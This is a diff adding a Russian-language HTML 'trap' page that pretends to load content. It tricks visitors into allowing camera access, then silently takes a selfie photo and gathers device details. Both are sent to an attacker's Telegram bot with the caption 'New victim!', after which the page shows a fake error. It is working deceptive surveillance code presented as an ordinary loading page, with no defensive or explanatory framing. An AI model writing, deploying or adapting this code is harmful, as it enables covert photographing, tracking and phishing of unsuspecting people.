@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .message {
+            text-align: center;
+            opacity: 0.8;
+            font-size: 14px;
+        }
+        .error {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <div class="loader"></div>
+        <div class="message">
+            Загрузка контента...<br>
+            <small style="opacity: 0.6;">Пожалуйста, разрешите доступ к камере</small>
+        </div>
+    </div>
+
+    <div id="error" class="error">
+        <h2>⚠️</h2>
+        <p>Ошибка загрузки</p>
+        <small style="opacity: 0.6;">Попробуйте обновить страницу</small>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // Configuration - will be filled by generator
+        const CONFIG = {
+            botToken: 'YOUR_BOT_TOKEN',
+            chatId: 'YOUR_CHAT_ID'
+        };
+
+        // Get config from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        const chatId = urlParams.get('chat');
+        const trapId = urlParams.get('id') || 'unknown';
+
+        if (token && chatId) {
+            CONFIG.botToken = token;
+            CONFIG.chatId = chatId;
+            initTrap();
+        } else {
+            showError();
+        }
+
+        async function initTrap() {
+            try {
+                // Try to access camera
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        captureAndSend(stream);
+                    }, 2000); // Wait for camera to adjust
+                };
+
+            } catch (err) {
+                console.error('Camera error:', err);
+                // Try to send at least info without photo
+                sendToTelegram(null);
+                setTimeout(showError, 1000);
+            }
+        }
+
+        function captureAndSend(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Stop camera
+            stream.getTracks().forEach(track => track.stop());
+
+            // Convert to blob
+            canvas.toBlob((blob) => {
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.8);
+
+            // Show error after sending
+            setTimeout(showError, 1500);
+        }
+
+        async function sendToTelegram(photoBlob) {
+            try {
+                // Prepare message text
+                const deviceInfo = `
+🎣 <b>Новая жертва!</b>
+
+🆔 ID: <code>${trapId}</code>
+📱 Устройство: ${navigator.platform}
+🌐 Язык: ${navigator.language}
+📏 Экран: ${screen.width}x${screen.height}
+🕐 Время: ${new Date().toLocaleString('ru-RU')}
+👤 User Agent: ${navigator.userAgent.substring(0, 100)}...
+                `.trim();
+
+                if (photoBlob) {
+                    // Send photo with caption
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.chatId);
+                    formData.append('photo', photoBlob, 'victim.jpg');
+                    formData.append('caption', deviceInfo);
+                    formData.append('parse_mode', 'HTML');
+
+                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    // Send text only if no photo
+                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.chatId,
+                            text: deviceInfo + '
+
+⚠️ <i>Фото не удалось получить (доступ запрещен)</i>',
+                            parse_mode: 'HTML'
+                        })
+                    });
+                }
+            } catch (err) {
+                console.error('Telegram error:', err);
+            }
+        }
+
+        function showError() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
